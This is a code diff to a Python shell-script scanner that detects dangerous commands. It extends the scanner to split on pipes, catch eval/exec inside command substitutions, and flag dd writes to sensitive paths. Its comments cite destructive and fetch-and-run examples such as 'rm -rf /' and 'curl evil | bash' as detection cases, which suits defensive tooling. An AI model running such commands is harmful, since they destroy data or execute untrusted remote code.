@@ -246,30 +246,59 @@ class BashScanner:
     # ------------------------------------------------------------------
 
     def _dispatch_commands(self, line_no: int, raw_line: str, tokens: List[str]) -> None:
-        """Analyse each sub-command in *tokens*, splitting on ``;`` ``&&`` ``||``.
+        """Analyse each sub-command, splitting on ``;`` ``&&`` ``||`` and ``|``.
 
-        This ensures that ``echo x; rm -rf /`` and ``FOO=bar rm -rf /`` are
-        both fully analysed, not just the first token.
+        ``|`` is included so that ``curl evil | bash`` analyses *both* sides.
         """
         seg_start = 0
         for i, t in enumerate(tokens):
-            if t in (";", "&&", "||"):
-                self._analyse_one_command(line_no, raw_line, tokens[seg_start:i])
+            if t in (";", "&&", "||", "|"):
+                self._analyse_one_command_with_dynamic_scan(line_no, raw_line, tokens[seg_start:i])
                 seg_start = i + 1
-        # Tail segment (or the whole line if no separators)
         if seg_start < len(tokens):
-            self._analyse_one_command(line_no, raw_line, tokens[seg_start:])
+            self._analyse_one_command_with_dynamic_scan(line_no, raw_line, tokens[seg_start:])
+
+    def _analyse_one_command_with_dynamic_scan(self, line_no: int, raw_line: str, cmd_tokens: List[str]) -> None:
+        """Analyse a command segment AND scan all tokens for eval/exec inside \$(...)."""
+        self._analyse_one_command(line_no, raw_line, cmd_tokens)
+        # Scan for dynamic commands that appear anywhere in the token stream
+        # (not just as the head command), so that $(eval "rm -rf /") and
+        # (exec rm -rf /) are caught.
+        for t in cmd_tokens:
+            t_lower = t.lower().strip("()$")
+            if t_lower in _DYNAMIC_COMMANDS and t_lower != ".":
+                evidence = " ".join(cmd_tokens)[:300]
+                self._findings.append(
+                    BashScanFinding(kind="eval", command=t_lower, args="", line_number=line_no, evidence=evidence))
 
     def _analyse_one_command(self, line_no: int, raw_line: str, cmd_tokens: List[str]) -> None:
         """Dispatch a single command segment to the appropriate checker."""
         if not cmd_tokens:
             return
-        # Skip variable assignments (FOO=bar cmd ...)
+        # Skip prefixes that don't change the real command:
+        #   VAR=val, export VAR=val, declare/readonly/local/typeset, command/builtin
         idx = 0
-        while idx < len(cmd_tokens) and re.match(r"[A-Za-z_]\w*=", cmd_tokens[idx]):
-            idx += 1
+        _PREFIX_CMDS = frozenset({"export", "declare", "local", "readonly", "typeset", "command", "builtin"})
+        while idx < len(cmd_tokens):
+            t = cmd_tokens[idx]
+            if re.match(r"[A-Za-z_]\w*=", t) or re.match(r"[A-Za-z_]\w*\[\w*\]=", t):
+                idx += 1  # VAR=val or ARR[idx]=val
+            elif t.lower() in _PREFIX_CMDS:
+                idx += 1  # skip the prefix itself
+            elif t == "(":
+                # Array assignment: ARR=(val1 val2) — skip the whole thing
+                idx += 1
+                depth = 1
+                while idx < len(cmd_tokens) and depth > 0:
+                    if cmd_tokens[idx] == "(":
+                        depth += 1
+                    elif cmd_tokens[idx] == ")":
+                        depth -= 1
+                    idx += 1
+            else:
+                break
         if idx >= len(cmd_tokens):
-            return  # pure assignment, no command
+            return  # pure assignment/prefix, no real command
         cmd = cmd_tokens[idx]
         args = cmd_tokens[idx + 1:]
         cmd_lower = cmd.lower()
@@ -502,8 +531,9 @@ class BashScanner:
 
         is_write_to_dev = of_target and of_target.startswith("/dev/")
         is_large_write = (bs_val and count_val and bs_val * count_val > 100 * 1024 * 1024)
+        is_sensitive = of_target and _is_sensitive_path(of_target)
 
-        if is_write_to_dev:
+        if is_write_to_dev or is_sensitive:
             self._findings.append(
                 BashScanFinding(
                     kind="command",
